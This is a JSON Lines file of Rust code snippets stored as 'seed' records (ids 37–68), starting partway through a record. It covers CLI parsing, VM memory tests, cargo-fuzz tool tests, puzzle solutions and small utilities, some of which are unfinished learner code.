\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nc_double\n>\n(\n4\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nString\n>\n(\n4\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\nVec\n<\nu8\n>\n>\n(\n4\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\n#\n[\ncfg\n(\nfeature\n=\n\"\ntime\n\"\n)\n]\nassert\n!\n(\nis_invalid_column_type\n(\nrow\n.\nget\n:\n:\n<\n_\ntime\n:\n:\nOffsetDateTime\n>\n(\n4\n)\n.\nunwrap_err\n(\n)\n)\n)\n;\nOk\n(\n(\n)\n)\n}","id":37}
{"seed":"pub fn parse_opts() -> Result<CliStatus, Error> {\n    let opt = Opt::from_args();\n    log::debug!(\"Cli opts are: {:?}\", opt);\n\n    match opt.cmd {\n        Command::Generate => {\n            generate_empty_config().context(\"Failed to generate config\")?;\n            log::info!(\"config.yml generated\");\n            Ok(CliStatus::Exit)\n        }\n        Command::Run {\n            config,\n            twil_sid,\n            twil_token,\n            twil_from,\n        } => {\n            if twil_sid.is_none() || twil_token.is_none() || twil_from.is_none() {\n                bail!(\"TWIL_ACCOUNT_SID, TWIL_AUTH_TOKEN & TWIL_FROM env variables must be set, or passed via --twil-sid, --twil-token & --twil-from\");\n            }\n            let twil_sid = twil_sid.unwrap();\n            let twil_token = twil_token.unwrap();\n            let twil_from = twil_from.unwrap();\n\n            let app_config = AppConfig::new(config, twil_sid, twil_token, twil_from)\n                .context(\"Failed to get config\")?;\n\n            Ok(CliStatus::Continue(app_config))\n        }\n    }\n}","id":38}
{"seed":"pub fn parse(raw: &str) -> Option<game::Game> {\n    let game_raw: GameRaw = serde_json::from_str(raw).ok()?;\n\n    let even_initial_timelines = game_raw\n        .timelines\n        .iter()\n        .any(|tl| tl.index == -0.5 || tl.index == 0.5);\n\n    let min_timeline = game_raw.timelines\n        .iter()\n        .map(|tl| tl.index)\n        .min_by_key(|x| (*x) as isize)?;\n    let max_timeline = game_raw.timelines\n        .iter()\n        .map(|tl| tl.index)\n        .max_by_key(|x| (*x) as isize)?;\n\n    let timeline_width = ((-min_timeline).min(max_timeline) + 1.0).round();\n    let active_timelines = game_raw.timelines\n        .iter()\n        .filter(|tl| tl.index.abs() <= timeline_width);\n    let present = active_timelines\n        .map(|tl| tl.begins_at + (tl.states.len() as isize) - 1)\n        .min()?;\n\n    let mut res = game::Game::new(game_raw.width, game_raw.height);\n\n    res.info.present = present;\n    res.info.min_timeline = de_l(min_timeline, even_initial_timelines);\n    res.info.max_timeline = de_l(max_timeline, even_initial_timelines);\n    res.info.active_player = game_raw.active_player;\n    res.info.even_initial_timelines = even_initial_timelines;\n\n    for tl in game_raw.timelines.into_iter() {\n        res.timelines.insert(\n            de_l(tl.index, even_initial_timelines),\n            de_timeline(tl, even_initial_timelines),\n        );\n    }\n\n    Some(res)\n}","id":39}
{"seed":"fn assert_memory_load_bytes<R: Rng, M: Memory>(\n    rng: &mut R,\n    memory: &mut M,\n    buffer_size: usize,\n    addr: u64,\n) {\n    let mut buffer_store = Vec::<u8>::new();\n    buffer_store.resize(buffer_size, 0);\n    rng.fill(buffer_store.as_mut_slice());\n\n    memory\n        .store_bytes(addr, &buffer_store.as_slice())\n        .expect(\"store bytes failed\");\n\n    let buffer_load = memory\n        .load_bytes(addr, buffer_store.len() as u64)\n        .expect(\"load bytes failed\")\n        .to_vec();\n\n    assert!(buffer_load.cmp(&buffer_store).is_eq());\n\n    \/\/ length out of bound\n    let outofbound_size = if buffer_store.is_empty() {\n        memory.memory_size() + 1\n    } else {\n        buffer_store.len() + memory.memory_size()\n    };\n    let ret = memory.load_bytes(addr, outofbound_size as u64);\n    assert!(ret.is_err());\n    assert_eq!(ret.err().unwrap(), Error::MemOutOfBound);\n\n    \/\/ address out of bound\n    let ret = memory.load_bytes(\n        addr + memory.memory_size() as u64 + 1,\n        buffer_store.len() as u64,\n    );\n    if buffer_store.is_empty() {\n        assert!(ret.is_ok())\n    } else {\n        assert!(ret.is_err());\n        assert_eq!(ret.err().unwrap(), Error::MemOutOfBound);\n    }\n\n    \/\/ addr + size is overflow\n    let ret = memory.load_bytes(addr + (0xFFFFFFFFFFFFFF - addr), buffer_store.len() as u64);\n    if buffer_store.is_empty() {\n        assert!(ret.is_ok());\n    } else {\n        assert!(ret.is_err());\n        assert_eq!(ret.err().unwrap(), Error::MemOutOfBound);\n    }\n}","id":40}
{"seed":"fn main() {\n\n  let nhits = 20;\n  let ntrials = 2000;\n  let nnanos = 60 * 1000 * 1000 * 1000;\n  let ntransfers = 1000;\n  let nbrokers = 8;\n  let tolerance = 0.05;\n  let ops = (ntransfers * nbrokers) as f64;\n  let million = (1000 * 1000) as f64;\n\n  let mut sum = 0.0;\n\n  let mut hits = 0;\n  let mut trial = 0;\n  let limit = time::precise_time_ns() + nnanos;\n  while hits < nhits && trial < ntrials && time::precise_time_ns() < limit {\n    let mut table = HashMapOfTreeMap::new();\n    let start = time::precise_time_ns();\n    for _ in 0..nbrokers {\n      broker(&mut table, ntransfers);\n    }\n    let end = time::precise_time_ns();\n    let ns = (end - start) as f64;\n    let x = ops \/ ns * million;\n    sum += x;\n    let n = (trial + 1) as f64;\n    let mean = sum \/ n;\n    let dev = (x - mean).abs() \/ mean;\n    if dev <= tolerance {\n      println!(\"{:5} {:8.2} ops\/ms ({:8.2})\", trial, x, mean);\n      hits += 1;\n    }\n    trial += 1;\n  }\n}","id":41}
{"seed":"fn read_input_configurations(confs: Vec<PathBuf>) -> (Vec<ComponentEntry>, Vec<ComponentEntry>) {\n    let mut configurations = Vec::new();\n\n    for path in confs {\n        match read_configuration(&path) {\n            Ok(conf) => configurations.push(conf),\n            Err(err) => eprintln!(\"{}\", err),\n        }\n    }\n\n    eprint!(\"\\n\");\n\n    let current_dir = current_dir().unwrap_or(PathBuf::new());\n    let entries = configurations\n        .iter()\n        .map(|conf| ReadConf {\n            conf: None,\n            path: current_dir.join(&conf.path),\n            backup_conf: None,\n            description: conf.description.clone(),\n            volume_type: conf.volume_type.clone(),\n        })\n        .map(|conf| ComponentEntry::ConfigurationFile(conf))\n        .collect::<Vec<_>>();\n\n    let components = configurations\n        .into_iter()\n        .map(|conf| ComponentEntry::ConfigurationFile(conf))\n        .collect::<Vec<_>>();\n\n    (components, entries)\n}","id":42}
{"seed":"fn main() \n{\n    let args: Vec<String> = std::env::args().collect();\n\n    if args.len() < 2 {\n        eprintln!(\"Syntax: {} <filename>\", args[0]);\n        return;\n    }\n\n    let path    = Path::new(&args[1]);\n    let display = path.display();\n\n    let mut file = match File::open(&path)    {\n        Err(why) => panic!(\"Could not open file: {} (Reason: {})\", \n            display, why.description()),\n        Ok(file) => file\n    };\n\n    \/\/ read the full file into memory. panic on failure\n    let mut raw_file = Vec::new();\n    file.read_to_end(&mut raw_file).unwrap();\n\n    \/\/ construct a cursor so we can seek in the raw buffer\n    let mut cursor = Cursor::new(raw_file);\n    let mut image  = match decode_ppm_image(&mut cursor) {\n        Ok (img) => img,\n        Err(why) => panic!(\"Could not parse PPM file - Desc: {}\", why.description()),\n    };\n\n    show_image(&image);\n}","id":43}
{"seed":"fn build_stripping_dead_code() {\n    let project = project(\"build_strip\").with_fuzz().build();\n\n    \/\/ Create some targets.\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"build_strip_a\")\n        .assert()\n        .success();\n\n    project\n        .cargo_fuzz()\n        .arg(\"build\")\n        .arg(\"--strip-dead-code\")\n        .arg(\"--dev\")\n        .assert()\n        .success();\n\n    let build_dir = project.fuzz_build_dir().join(\"debug\");\n\n    let a_bin = build_dir.join(\"build_strip_a\");\n    assert!(a_bin.is_file(), \"Not a file: {}\", a_bin.display());\n}","id":44}
{"seed":"fn initialize(lines: &Vec<String>) -> Vec<Day> {\n    let regex = Regex::new(r\"(\\d\\d-\\d\\d) ((?:23|00):\\d\\d)\\] (Guard #(\\d*)|wakes|falls)\").expect(\"Building Regex failed\");\n    let mut events = lines.iter().map(|l| GuardEvent::from_line(l, &regex)).collect::<Vec<GuardEvent>>();\n    events.sort_by(|GuardEvent {date: date1, minute: minute1, ..}, GuardEvent {date: date2, minute: minute2, ..}| {\n        date1.cmp(date2).then(minute1.cmp(minute2))\n    });\n\n    let mut days = Vec::new();\n    let mut events_iter = events.iter();\n    let mut event_option = events_iter.next();\n    while event_option.is_some() {\n        let event = event_option.unwrap();\n        assert_eq!(event.action, BeginsShift);\n        let mut current_day = Day::new(event.guard_id.unwrap());\n        let mut is_awake = true;\n        event_option = events_iter.next();\n        for minute in 0..60 {\n            if event_option.map_or(false, |e| e.action != BeginsShift && e.minute == minute) {\n                is_awake = !is_awake;\n                event_option = events_iter.next();\n            }\n            current_day.set_next_minute(is_awake);\n        }\n        days.push(current_day);\n    }\n    days\n}","id":45}
{"seed":"pub fn test_memory_store_empty_bytes() {\n    assert_memory_store_empty_bytes(&mut FlatMemory::<u64>::default());\n    assert_memory_store_empty_bytes(&mut SparseMemory::<u64>::default());\n    assert_memory_store_empty_bytes(&mut WXorXMemory::<FlatMemory<u64>>::default());\n    #[cfg(has_asm)]\n    assert_memory_store_empty_bytes(&mut AsmCoreMachine::new(ISA_IMC, VERSION0, 200_000));\n}","id":46}
{"seed":"fn run_with_coverage() {\n    let target = \"with_coverage\";\n\n    let project = project(\"run_with_coverage\")\n        .with_fuzz()\n        .fuzz_target(\n            target,\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    println!(\"{:?}\", data);\n                });\n            \"#,\n        )\n        .build();\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(target)\n        .arg(\"--\")\n        .arg(\"-runs=100\")\n        .assert()\n        .stderr(predicate::str::contains(\"Done 100 runs\"))\n        .success();\n\n    project\n        .cargo_fuzz()\n        .arg(\"coverage\")\n        .arg(target)\n        .assert()\n        .stderr(predicate::str::contains(\"Coverage data merged and saved\"))\n        .success();\n\n    let profdata_file = project.fuzz_coverage_dir(target).join(\"coverage.profdata\");\n    assert!(profdata_file.exists(), \"Coverage data file not generated\");\n}","id":47}
{"seed":"const fn null_ble_gatt_svc_def() -> ble_gatt_svc_def {\n    return ble_gatt_svc_def {\n        type_: BLE_GATT_SVC_TYPE_END as u8,\n        uuid: ptr::null(),\n        includes: ptr::null_mut(),\n        characteristics: ptr::null(),\n    };\n}","id":48}
{"seed":"pub fn main() {\n    let opts = TileOptions {\n        parent_x: 108,\n        parent_y: 54,\n        width: 10,\n        height: 10,\n        max_value: 10.0,\n        min_value: 0.0,\n        mean: 5.0,\n        std_dev: 2.0,\n    };\n    let t = NormalDistTile::new(opts);\n    println!(\" {:?}\", t.subtiles);\n    println!(\"{}\", t.get(0, 0));\n    println!(\"{}\", t.get(1, 0));\n    println!(\"{}\", t.get(2, 0));\n    println!(\"{}\", t.get(3, 0));\n\n    println!(\"{}\", t.get(0, 5));\n    println!(\"{}\", t.get(1, 5));\n    println!(\"{}\", t.get(2, 5));\n    println!(\"{}\", t.get(3, 5));\n\n    println!(\"{}\", t.get((t.width - 4) as u8, (t.height - 1) as u8));\n    println!(\"{}\", t.get((t.width - 3) as u8, (t.height - 1) as u8));\n    println!(\"{}\", t.get((t.width - 2) as u8, (t.height - 1) as u8));\n    println!(\"{}\", t.get((t.width - 1) as u8, (t.height - 1) as u8));\n}","id":49}
{"seed":"pub async fn run() -> Result<()> {\n\tlet args = init().await?;\n\tdebug!(?args, \"arguments\");\n\n\tif args.manual {\n\t\trun_manpage(args).await\n\t} else if let Some(shell) = args.completions {\n\t\trun_completions(shell).await\n\t} else {\n\t\trun_watchexec(args).await\n\t}\n}","id":50}
{"seed":"fn run_without_sanitizer_with_crash() {\n    let project = project(\"run_without_sanitizer_with_crash\")\n        .with_fuzz()\n        .fuzz_target(\n            \"yes_crash\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    run_without_sanitizer_with_crash::fail_fuzzing(data);\n                });\n            \"#,\n        )\n        .build();\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"yes_crash\")\n        .arg(\"--\")\n        .arg(\"-runs=1000\")\n        .arg(\"-sanitizer=none\")\n        .env(\"RUST_BACKTRACE\", \"1\")\n        .assert()\n        .stderr(\n            predicate::str::contains(\"panicked at 'I'm afraid of number 7'\")\n                .and(predicate::str::contains(\"ERROR: libFuzzer: deadly signal\"))\n                .and(predicate::str::contains(\"run_without_sanitizer_with_crash::fail_fuzzing\"))\n                .and(predicate::str::contains(\n                    \"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\\n\\\n                     \\n\\\n                     Failing input:\\n\\\n                     \\n\\\n                     \\tfuzz\/artifacts\/yes_crash\/crash-\"\n                ))\n                .and(predicate::str::contains(\"Output of `std::fmt::Debug`:\"))\n                .and(predicate::str::contains(\n                    \"Reproduce with:\\n\\\n                     \\n\\\n                     \\tcargo fuzz run yes_crash fuzz\/artifacts\/yes_crash\/crash-\"\n                ))\n                .and(predicate::str::contains(\n                    \"Minimize test case with:\\n\\\n                     \\n\\\n                     \\tcargo fuzz tmin yes_crash fuzz\/artifacts\/yes_crash\/crash-\"\n                )),\n        )\n        .failure();\n}","id":51}
{"seed":"fn build_author_map(\n    repo: &Repository,\n    reviewers: &Reviewers,\n    mailmap: &Mailmap,\n    from: &str,\n    to: &str,\n) -> Result<AuthorMap, Box<dyn std::error::Error>> {\n    match build_author_map_(repo, reviewers, mailmap, from, to) {\n        Ok(o) => Ok(o),\n        Err(err) => Err(ErrorContext(\n            format!(\n                \"build_author_map(repo={}, from={:?}, to={:?})\",\n                repo.path().display(),\n                from,\n                to\n            ),\n            err,\n        ))?,\n    }\n}","id":52}
{"seed":"fn create_mesh_buffer_verts(\n    chunk: &Chunk,\n    device: &wgpu::Device,\n    queue: &wgpu::Queue,\n) -> MeshBufferVerts {\n    \/\/ Calculate total length of buffer e.g. a full chunk of different voxels. This way a new buffer only has to be created when the voxel capacity is changed.\n\n    let verts = Mesh::verts(chunk);\n    let vert_len = verts.len();\n\n    let single_cube_verts = Mesh::cube_verts().len();\n    let single_cube_color_verts = (single_cube_verts \/ 3) * std::mem::size_of::<PaletteIndexType>(); \/\/ One PaletteIndexType per 3 verts\n\n    let max_voxels = {\n        let (x, y, z) = chunk.capacity();\n        x * y * z\n    };\n\n    let max_buf_size =\n        (single_cube_verts + single_cube_color_verts) * max_voxels * std::mem::size_of::<f32>();\n\n    let buffer = device.create_buffer(&wgpu::BufferDescriptor {\n        label: None,\n        mapped_at_creation: false,\n        size: max_buf_size as u64,\n        usage: wgpu::BufferUsage::VERTEX | wgpu::BufferUsage::COPY_DST,\n    });\n\n    if vert_len > 0 {\n        queue.write_buffer(&buffer, 0, bytemuck::cast_slice(&verts));\n    }\n\n    MeshBufferVerts {\n        buffer,\n        vert_len,\n        max_capacity: chunk.capacity(),\n    }\n}","id":53}
{"seed":"pub fn acrn_write(file_path: &str, contents: &str) -> Result<(), String> {\n    let mut file = File::create(file_path).map_err(|e| e.to_string())?;\n    file.write_all(contents.as_bytes())\n        .map_err(|e| e.to_string())?;\n    Ok(())\n}","id":54}
{"seed":"fn init_with_target() {\n    let project = project(\"init_with_target\").build();\n    project\n        .cargo_fuzz()\n        .arg(\"init\")\n        .arg(\"-t\")\n        .arg(\"custom_target_name\")\n        .assert()\n        .success();\n    assert!(project.fuzz_dir().is_dir());\n    assert!(project.fuzz_cargo_toml().is_file());\n    assert!(project.fuzz_targets_dir().is_dir());\n    assert!(project.fuzz_target_path(\"custom_target_name\").is_file());\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"custom_target_name\")\n        .arg(\"--\")\n        .arg(\"-runs=1\")\n        .assert()\n        .success();\n}","id":55}
{"seed":"pub fn channel_take<T: Any + Clone>(target: CAddr) -> T {\n    let (result, payload) = system_call_take_payload(SystemCall::ChannelTake {\n        request: target,\n        response: None\n    });\n    match result {\n        SystemCall::ChannelTake {\n            request: _,\n            response: Some(ChannelMessage::Payload),\n        } => {\n            return payload;\n        },\n        _ => panic!(),\n    };\n}","id":56}
{"seed":"fn git(args: &[&str]) -> Result<String, Box<dyn std::error::Error>> {\n    let mut cmd = Command::new(\"git\");\n    cmd.args(args);\n    cmd.stdout(Stdio::piped());\n    let out = cmd.spawn();\n    let mut out = match out {\n        Ok(v) => v,\n        Err(err) => {\n            panic!(\"Failed to spawn command `{:?}`: {:?}\", cmd, err);\n        }\n    };\n\n    let status = out.wait().expect(\"waited\");\n\n    if !status.success() {\n        eprintln!(\"failed to run `git {:?}`: {:?}\", args, status);\n        return Err(std::io::Error::from(std::io::ErrorKind::Other).into());\n    }\n\n    let mut stdout = Vec::new();\n    out.stdout.unwrap().read_to_end(&mut stdout).unwrap();\n    Ok(String::from_utf8_lossy(&stdout).into_owned())\n}","id":57}
{"seed":"fn generate_thanks() -> Result<BTreeMap<VersionTag, AuthorMap>, Box<dyn std::error::Error>> {\n    let path = update_repo(\"https:\/\/github.com\/rust-lang\/rust.git\")?;\n    let repo = git2::Repository::open(&path)?;\n    let mailmap = mailmap_from_repo(&repo)?;\n    let reviewers = Reviewers::new()?;\n\n    let mut versions = get_versions(&repo)?;\n    let last_full_stable = versions\n        .iter()\n        .rfind(|v| v.raw_tag.ends_with(\".0\"))\n        .unwrap()\n        .version\n        .clone();\n\n    versions.push(VersionTag {\n        name: String::from(\"Beta\"),\n        version: {\n            let mut last = last_full_stable.clone();\n            last.minor += 1;\n            last\n        },\n        raw_tag: String::from(\"beta\"),\n        commit: repo\n            .revparse_single(\"beta\")\n            .unwrap()\n            .peel_to_commit()\n            .unwrap()\n            .id(),\n        in_progress: true,\n    });\n    versions.push(VersionTag {\n        name: String::from(\"Master\"),\n        version: {\n            \/\/ master is plus 1 minor versions off of beta, which we just pushed\n            let mut last = last_full_stable.clone();\n            last.minor += 2;\n            last\n        },\n        raw_tag: String::from(\"master\"),\n        commit: repo\n            .revparse_single(\"master\")\n            .unwrap()\n            .peel_to_commit()\n            .unwrap()\n            .id(),\n        in_progress: true,\n    });\n\n    let mut version_map = BTreeMap::new();\n\n    let mut cache = HashMap::new();\n\n    for (idx, version) in versions.iter().enumerate() {\n        let previous = if let Some(v) = idx.checked_sub(1).map(|idx| &versions[idx]) {\n            v\n        } else {\n            let author_map = build_author_map(&repo, &reviewers, &mailmap, \"\", &version.raw_tag)?;\n            version_map.insert(version.clone(), author_map);\n            continue;\n        };\n\n        eprintln!(\"Processing {:?} to {:?}\", previous, version);\n\n        cache.insert(\n            version,\n            up_to_release(&repo, &reviewers, &mailmap, &version)?,\n        );\n        let previous = match cache.remove(&previous) {\n            Some(v) => v,\n            None => up_to_release(&repo, &reviewers, &mailmap, &previous)?,\n        };\n        let current = cache.get(&version).unwrap();\n\n        \/\/ Remove commits reachable from the previous release.\n        let only_current = current.difference(&previous);\n        version_map.insert(version.clone(), only_current);\n    }\n\n    Ok(version_map)\n}","id":58}
{"seed":"pub fn bubble_sort<T: PartialOrd + Debug>(v: &mut [T]) {\n    for p in 0..v.len() {\n        \/\/ println!(\"{:?}\", v);\n        let mut sorted = true;\n        for i in 0..(v.len()-1) - p{\n            if v[i] > v[i+1] {\n                v.swap(i, i+1);\n                sorted = false;\n            }\n        }\n        if sorted {\n            return;\n        }\n    }\n}","id":59}
{"seed":"fn trait_test() {\n    {\n        use std::io::Write;\n\n        fn say_hello(out: &mut Write) -> std::io::Result<()> {\n            out.write_all(b\"hello world\\n\")?;\n            out.flush()\n        }\n\n        \/\/ use std::fs::File;\n\n        \/\/ let mut local_file = File::create(\"hello.txt\");\n        \/\/ say_hello(&mut local_file).expect(\"error\"); \/\/ could not work, now\n\n        let mut bytes = vec![];\n        say_hello(&mut bytes).expect(\"error\"); \/\/ works\n        assert_eq!(bytes, b\"hello world\\n\");\n\n        \/\/ 11.1\n\n        let mut buf: Vec<u8> = vec![];\n        buf.write_all(b\"hello\").expect(\"error\");\n    }\n    \/\/ 11.1.1\n\n    {\n        use std::io::Write;\n\n        let mut buf: Vec<u8> = vec![];\n        \/\/ let writer: Write = buf; \/\/ error: `Write` does not have a constant size\n        let writer: &mut Write = &mut buf; \/\/ ok\n        writer.write_all(b\"hello\").expect(\"error\");\n        assert_eq!(buf, b\"hello\");\n    }\n\n    \/\/ 11.1.3\n    {\n        use std::io::Write;\n        fn say_hello<W: Write>(out: &mut W) -> std::io::Result<()> {\n            out.write_all(b\"hello world\\n\")?;\n            out.flush()\n        }\n        let mut buf: Vec<u8> = vec![];\n        buf.write_all(b\"hello\").expect(\"error\");\n        buf::<Vec>.write_all(b\"hello\").expect(\"error\");\n\n        \/\/ let v1 = (0 .. 1000).collect(); \/\/ error: can't infer type\n        let v2 = (0..1000).collect::<Vec<i32>>(); \/\/ ok\n\n        \/\/ \/\/\/ Run a query on large, partitioned data set.\n        \/\/ \/\/\/ See <http:\/\/research.google.com\/archive\/mapreduce.html>.\n        \/\/ fn run_query<M: Mapper + Serialize, R: Reducer + Serialize>(data: &dataSet, map: M, reduce: R) -> Results {\n        \/\/ }\n        \/\/\n        \/\/ fun run_query<M, R>(data: &Dataset, map: M, reduce: R) -> Results\n        \/\/     where M: Mapper + Serialize,\n        \/\/           R: Reducer + Serialize\n        \/\/ {}\n\n        \/\/ fn nearest<'t, 'c, P>(target: &'t P, candidates: &'c [P]) -> &'c P\n        \/\/     where P: MeasureDistance\n        \/\/ {}\n        \/\/\n        \/\/ impl PancakeStack {\n        \/\/    fn Push<:T Topping>(&mut self, goop: T) - PancakeResult<()> {\n        \/\/    }\n        \/\/ }\n        \/\/ type PancakeResult<T> = Result<T, PancakeError>;\n    }\n    {\n        \/\/ struct Broom {\n        \/\/     name: String,\n        \/\/     height: u32,\n        \/\/     health: u32,\n        \/\/     position: (f32, f32, f32),\n        \/\/     intent: BroomIntent,\n        \/\/ }\n        \/\/ impl Broom {\n        \/\/     fn boomstick_range(&self) -> Range<i32> {\n        \/\/         self.y - self.height - 1 .. self.y\n        \/\/     }\n        \/\/ }\n        \/\/ trait Visible {\n        \/\/     fn draw(&self, canvas: &mut Canvas);\n        \/\/     fn hit_test(&self, x: i32, y: i32) -> bool;\n        \/\/ }\n        \/\/ impl Visible for Broom {\n        \/\/     fn draw(&self, canvas: &mut Canvas) {\n        \/\/         \/\/for y in self.y - self.height - 1 .. self.y {\n        \/\/         for y in self.broomstick_range() {\n        \/\/             canvas.write_at(self.x, y, '|');\n        \/\/         }\n        \/\/         canvas.write_at(self.x, y, 'M');\n        \/\/     }\n        \/\/ }\n\n        \/\/ fn hit_test(&self, x: i32, y:i32) -> bool {\n        \/\/     self.x == x\n        \/\/         && self.y - self.height - 1 <= y\n        \/\/         && y <- self.y\n        \/\/ }\n\n    }\n    {\n        \/\/ 11.2.1\n\n        \/\/\/ A writer that ignores whatever data you write to it.\n        pub struct Sink;\n\n        use std::io::{Result, Write};\n\n        impl Write for Sink {\n            fn write(&mut self, buf: &[u8]) -> Result<usize> {\n                Ok(buf.len())\n            }\n            fn flush(&mut self) -> Result<()> {\n                Ok(())\n            }\n        }\n    }\n    {\n        \/\/ 11.2.2\n\n        trait IsEmoji {\n            fn is_emoji(&self) -> bool;\n        }\n\n        impl IsEmoji for char {\n            fn is_emoji(&self) -> bool {\n                return false;\n            }\n        }\n        assert_eq!('$'.is_emoji(), false);\n\n        use std::io::{self, Write};\n\n        struct HtmlDocument;\n\n        trait WriteHtml {\n            fn write_html(&mut self, html: &HtmlDocument) -> std::io::Result<()>;\n        }\n\n        impl<W: Write> WriteHtml for W {\n            fn write_html(&mut self, html: &HtmlDocument) -> io::Result<()> {\n                Ok(())\n            }\n        }\n\n        extern crate serde;\n        use serde::Serialize;\n        use serde_json;\n        use std::collections::HashMap;\n        use std::fs::File;\n\n        pub fn save_configuration(config: &HashMap<String, String>) -> std::io::Result<()> {\n            let writer = File::create(\"test.json\").expect(\"error\");\n            let mut serializer = serde_json::Serializer::new(writer);\n\n            config.serialize(&mut serializer).expect(\"error\");\n            Ok(())\n        }\n\n        {\n            \/\/ 11.2.3\n        }\n    }\n}","id":60}
{"seed":"pub fn test_trace() {\n    let buffer = fs::read(\"tests\/programs\/trace64\").unwrap().into();\n    let result = run::<u64, SparseMemory<u64>>(&buffer, &vec![\"trace64\".into()]);\n    assert!(result.is_err());\n    assert_eq!(result.err(), Some(Error::MemWriteOnExecutablePage));\n}","id":61}
{"seed":"pub fn test_outofcycles_in_syscall() {\n    let buffer = fs::read(\"tests\/programs\/syscall64\").unwrap().into();\n    let core_machine = DefaultCoreMachine::<u64, SparseMemory<u64>>::new(ISA_IMC, VERSION0, 20);\n    let mut machine = DefaultMachineBuilder::new(core_machine)\n        .instruction_cycle_func(Box::new(constant_cycles))\n        .syscall(Box::new(OutOfCyclesSyscall {}))\n        .build();\n    machine\n        .load_program(&buffer, &vec![\"syscall\".into()])\n        .unwrap();\n    let result = machine.run();\n    assert!(result.is_err());\n    assert_eq!(result.unwrap_err(), Error::CyclesExceeded);\n    assert_eq!(machine.cycles(), 108);\n    assert_eq!(machine.registers()[A0], 39);\n}","id":62}
{"seed":"pub fn star1(lines: &Vec<String>) -> String {\n    let days = initialize(lines);\n\n    let mut guard_map = HashMap::new();\n    for day in days {\n        guard_map.entry(day.guard_id)\n            .or_insert(vec![])\n            .push(day);\n    }\n\n    let (&sleepiest_guard_id, sleepiest_guard_days) = guard_map.iter()\n        .max_by_key(|(_, v)| v.iter()\n            .map(|day| 60 - day.minutes_awake)\n            .sum::<i32>()\n    ).unwrap();\n    let mut sleepiest_guard_awake_by_minutes = vec![0; 60];\n    for day in sleepiest_guard_days {\n        \/\/ println!(\"Day: {:?}\", day);\n        for minute in 0..60 {\n            sleepiest_guard_awake_by_minutes[minute] += i32::from(day.minutes[minute]);\n        }\n    }\n    let (max_minute, _) = sleepiest_guard_awake_by_minutes.iter().enumerate().min_by_key(|(_, times)| *times).unwrap();\n\n    println!(\"Min minute: {}, max guard: {}\", max_minute, sleepiest_guard_id);\n\n    (sleepiest_guard_id * max_minute as i32).to_string()\n}","id":63}
{"seed":"pub fn day09_1(s : String) -> u32{\n    let mut running_total = 0;\n    let mut scope = 0;\n\n    let mut in_garbage = false;\n    let mut prev_cancel = false;\n    for c in s.chars(){\n        if in_garbage {\n            if c == '>' && !prev_cancel {\n                in_garbage = false;\n                prev_cancel = false;\n            }\n            else if c == '!' && !prev_cancel {\n                prev_cancel = true;\n            }\n            else {\n                prev_cancel = false;\n            }\n        }\n        else{\n            if c == '{' {\n                scope+=1;\n                running_total+=scope;\n            }\n            else if c == '}' {\n                scope -=1;\n            }\n            else if c == '<' {\n                in_garbage = true;\n            }\n        }\n    }\n    running_total\n}","id":64}
{"seed":"pub fn retype_raw_page_free(source: CAddr) -> CAddr {\n    let result = system_call(SystemCall::RetypeRawPageFree {\n        request: source,\n        response: None\n    });\n    match result {\n        SystemCall::RetypeRawPageFree {\n            response, ..\n        } => { return response.unwrap(); },\n        _ => panic!(),\n    };\n}","id":65}
{"seed":"fn parseFromFile(file: &File) {\r\n    let mut reader = BufReader::new(file);\r\n    let mut buf = String::from(\"\");\r\n    let line_index = 0;\r\n    let mut models: Vec<Model> = Vec::new();\r\n    let mut lights: Vec<Model> = Vec::new();\r\n    while (reader.read_line(&mut buf) != 0) {\r\n        if lien_index == 0 {\r\n            if line == 'm' {\r\n                \/\/now we read the model data\r\n                reader.read_line(&mut buf);\r\n                let model_count = buf.trim().parse().expect(\"it's not a number\");\r\n                let mut model_index = 0;\r\n                while model_index < model_count {\r\n                    parseModelInfo(&mut reader, &mut buf, &mut models)\r\n                    model_index += 1;\r\n                }\r\n            }\r\n            if line == 'l' {\r\n                reader.read_line(&mut buf);\r\n                let light_count = buf.trim().parse().expect(\"it's not a number\");\r\n                let mut light_index = 0;\r\n                while light_index < light_count {\r\n                    parseModelInfo(&mut reader, &mut buf, &mut models)\r\n                    model_index += 1;\r\n                }\r\n            }\r\n        }\r\n    }\r\n}","id":66}
{"seed":"fn main() {\n    if let Err(err) = Config::new().and_then(|conf| ui::user_menu(conf)) {\n        eprintln!(\"{}\", err);\n        process::exit(1);\n    }\n}","id":67}
{"seed":"async fn get_price_ticker() {\n    let exchange = init().await;\n    let req = GetPriceTickerRequest {\n        market_pair: \"eth_btc\".to_string(),\n    };\n    let resp = exchange.get_price_ticker(&req).await.unwrap();\n    println!(\"{:?}\", resp);\n}","id":68}
